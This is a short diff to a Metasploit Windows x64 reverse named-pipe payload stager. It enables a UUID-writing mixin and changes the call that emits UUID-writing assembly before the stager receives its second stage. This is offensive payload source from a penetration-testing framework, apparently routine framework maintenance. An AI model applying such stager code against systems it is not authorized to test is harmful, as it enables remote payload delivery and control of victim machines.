@@ -2,7 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/transport_config'
-#require 'msf/core/payload/windows/x64/write_uuid'
+require 'msf/core/payload/windows/x64/write_uuid'
 require 'msf/core/payload/windows/x64/block_api'
 require 'msf/core/payload/windows/x64/exitfunk'
 
@@ -18,7 +18,7 @@ module Payload::Windows::ReverseNamedPipe_x64
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
-  #include Msf::Payload::Windows::WriteUUID_x64
+  include Msf::Payload::Windows::WriteUUID_x64
   include Msf::Payload::Windows::BlockApi_x64
   include Msf::Payload::Windows::Exitfunk_x64
 
@@ -163,7 +163,7 @@ module Payload::Windows::ReverseNamedPipe_x64
       connected:
         xchg rdi, rax           ; Save the file handler for later
     ^
-    #asm << asm_send_uuid if include_send_uuid
+    asm << asm_write_uuid if include_send_uuid
 
     asm << %Q^
       ; Receive the size of the incoming second stage...
